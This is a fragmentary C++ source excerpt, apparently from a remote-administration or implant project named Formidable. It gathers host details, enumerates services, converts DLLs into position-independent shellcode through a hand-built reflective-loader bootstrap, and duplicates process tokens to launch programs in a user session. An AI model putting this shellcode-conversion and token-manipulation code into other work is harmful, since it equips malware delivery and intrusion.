...
namespace Formidable {
    ...
    std::string GetCpuBrand() {
        ...
        cpuBrand[sizeof(cpuBrand) - 1] = 0; // Ensure null termination
    ...
    std::string GetExeVersion() {
        ...
        if (!GetFileVersionInfoA(filePath, 0, verSize, verData.data())) return "1.0.0.0";
...
#pragma pack(pop)
    ...
    static BOOL CALLBACK InternalEnumWindowsProc(HWND hWnd, LPARAM lParam) {
    ...
    std::vector<ServiceDetail> GetServiceList() {
        ...
        if (EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, 
            ...
            for (DWORD i = 0; i < servicesCount; i++) {
                ...
                if (hService) {
                    DWORD configSize = 0;
                    (void)QueryServiceConfigW(hService, NULL, 0, &configSize);
    ...
    BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, DWORD flags, LPSTR* outBytes, DWORD* outLength)
    {
        ...
        if (Is64BitDLL((UINT_PTR)inBytes)) {
            ...
            BYTE bootstrap[69] = { 0 };
            DWORD i = 0;
            bootstrap[i++] = 0xe8; bootstrap[i++] = 0x00; bootstrap[i++] = 0x00; bootstrap[i++] = 0x00; bootstrap[i++] = 0x00;
            dllOffset = sizeof(bootstrap) - i + rdiShellcodeLength;
            bootstrap[i++] = 0x59;
            bootstrap[i++] = 0x49; bootstrap[i++] = 0x89; bootstrap[i++] = 0xc8;
            bootstrap[i++] = 0xba;
            MoveMemory(bootstrap + i, &userFunction, sizeof(userFunction));
            i += sizeof(userFunction);
            bootstrap[i++] = 0x49; bootstrap[i++] = 0x81; bootstrap[i++] = 0xc0;
            ...
            bootstrap[i++] = 0x41; bootstrap[i++] = 0xb9;
            MoveMemory(bootstrap + i, &userLength, sizeof(userLength));
            i += sizeof(userLength);
            bootstrap[i++] = 0x56;
            bootstrap[i++] = 0x48; bootstrap[i++] = 0x89; bootstrap[i++] = 0xe6;
            bootstrap[i++] = 0x48; bootstrap[i++] = 0x83; bootstrap[i++] = 0xe4; bootstrap[i++] = 0xf0;
            bootstrap[i++] = 0x48; bootstrap[i++] = 0x83; bootstrap[i++] = 0xec; bootstrap[i++] = 6 * 8;
            bootstrap[i++] = 0x48; bootstrap[i++] = 0x89; bootstrap[i++] = 0x4C; bootstrap[i++] = 0x24; bootstrap[i++] = 4 * 8;
            bootstrap[i++] = 0x48; bootstrap[i++] = 0x81; bootstrap[i++] = 0xc1;
            MoveMemory(bootstrap + i, &dllOffset, sizeof(dllOffset));
            i += sizeof(dllOffset);
            bootstrap[i++] = 0xC7; bootstrap[i++] = 0x44; bootstrap[i++] = 0x24; bootstrap[i++] = 5 * 8;
            MoveMemory(bootstrap + i, &flags, sizeof(flags));
            i += sizeof(flags);
            bootstrap[i++] = 0xe8;
            DWORD relOffset = sizeof(bootstrap) - (i + 4);
            bootstrap[i++] = (BYTE)relOffset;
            bootstrap[i++] = 0x00; bootstrap[i++] = 0x00; bootstrap[i++] = 0x00;
            bootstrap[i++] = 0x48; bootstrap[i++] = 0x89; bootstrap[i++] = 0xf4;
            bootstrap[i++] = 0x5e;
            bootstrap[i++] = 0xc3;
            *outLength = length + userLength + rdiShellcodeLength + sizeof(bootstrap);
            if (*outLength < sizeof(bootstrap)) return FALSE;
            *outBytes = (LPSTR)malloc(*outLength);
            ...
            bootstrap[i++] = 0x58;
            bootstrap[i++] = 0x55;
            bootstrap[i++] = 0x89; bootstrap[i++] = 0xe5;
            bootstrap[i++] = 0x89; bootstrap[i++] = 0xc2;
            bootstrap[i++] = 0x81; bootstrap[i++] = 0xc2;
            userDataLocation = dllOffset + length;
            MoveMemory(bootstrap + i, &userDataLocation, sizeof(userDataLocation));
            i += sizeof(userDataLocation);
            bootstrap[i++] = 0x68;
            ...
            bootstrap[i++] = (BYTE)relOffset;
            bootstrap[i++] = 0x00; bootstrap[i++] = 0x00; bootstrap[i++] = 0x00;
            bootstrap[i++] = 0x83; bootstrap[i++] = 0xc4; bootstrap[i++] = 0x14;
            bootstrap[i++] = 0xc9;
            bootstrap[i++] = 0xc3;
            *outLength = length + userLength + rdiShellcodeLength + sizeof(bootstrap);
            *outBytes = (LPSTR)malloc(*outLength);
    ...
    bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength, bool align)
    {
        if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
            LPSTR finalShellcode = NULL;
            DWORD finalSize;
            if (!ConvertToShellcode(originBuffer, ulOriginalLength, 0, NULL, 0, 0x1, &finalShellcode, &finalSize)) {
                return false;
            }
    ...
    void generate_random_iv(unsigned char* iv, size_t len)
    {
        ...
        if (!hCrypt) hCrypt = LoadLibraryA("bcrypt.dll");
        if (hCrypt) {
            typedef NTSTATUS(WINAPI* BCryptGenRandomF)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
            BCryptGenRandomF pBCryptGenRandom = (BCryptGenRandomF)GetProcAddress(hCrypt, "BCryptGenRandom");
            if (pBCryptGenRandom) {
                pBCryptGenRandom(NULL, iv, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            }
        }
    }
    ...
    bool LaunchInUserSession(const std::wstring& exePath) {
        ...
        auto enablePrivilege = [](LPCWSTR name) -> bool {
            HANDLE hToken = NULL;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
            LUID luid;
        ...
        HANDLE hProcessToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken)) return false;

        HANDLE hDupToken = NULL;
        if (!DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
            CloseHandle(hProcessToken);
            return false;
        }
        ...
        if (lpEnvironment) flags |= CREATE_UNICODE_ENVIRONMENT;
